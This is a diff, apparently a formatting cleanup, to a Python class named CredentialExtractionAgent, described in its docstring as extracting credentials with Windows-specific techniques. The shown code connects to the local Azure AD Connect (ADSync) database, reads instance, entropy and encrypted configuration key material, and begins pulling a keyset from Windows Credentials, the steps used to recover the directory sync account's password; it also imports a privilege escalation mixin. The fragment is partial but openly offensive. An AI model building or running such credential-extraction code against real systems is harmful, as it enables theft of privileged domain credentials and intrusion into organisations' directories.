@@ -31,8 +31,13 @@ from src.core.base.mixins.data_parsing_mixin import DataParsingMixin
 from src.core.base.mixins.privilege_escalation_mixin import PrivilegeEscalationMixin
 
 
-class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAccessMixin,
-                              CryptoMixin, DataParsingMixin):
+class CredentialExtractionAgent(
+    BaseAgent,
+    PrivilegeEscalationMixin,
+    DatabaseAccessMixin,
+    CryptoMixin,
+    DataParsingMixin
+):
     """Agent for extracting credentials using Windows-specific techniques."""
 
     def __init__(self, **kwargs: Any) -> None:
@@ -77,7 +82,10 @@ class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAcc
 
             try:
                 # Connect to ADSync database
-                conn_str = r"Driver={ODBC Driver 17 for SQL Server};Server=(LocalDB)\.\ADSync2019;Database=ADSync;Trusted_Connection=yes"
+                conn_str = (
+                    r"Driver={ODBC Driver 17 for SQL Server};"
+                    r"Server=(LocalDB)\.\ADSync2019;Database=ADSync;Trusted_Connection=yes"
+                )
                 if not self.connect_odbc(conn_str):
                     result["error"] = f"Failed to connect to ADSync database: {self.get_last_error()}"
                     return result
@@ -91,7 +99,7 @@ class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAcc
 
                 # Extract metadata
                 instance_id = UUID(bytes=metadata[0]["instance_id"])
-                _keyset_id = metadata[0]["keyset_id"]
+                # keyset_id = metadata[0]["keyset_id"]
                 entropy_id = UUID(bytes=metadata[0]["entropy"])
 
                 # Query key material
@@ -101,7 +109,7 @@ class CredentialExtractionAgent(BaseAgent, PrivilegeEscalationMixin, DatabaseAcc
                     result["error"] = "No key material found"
                     return result
 
-                _private_config = material[0]["private_configuration_xml"]
+                # _private_config = material[0]["private_configuration_xml"]
                 encrypted_config = material[0]["encrypted_configuration"]
 
                 # Read keyset from Windows Credentials
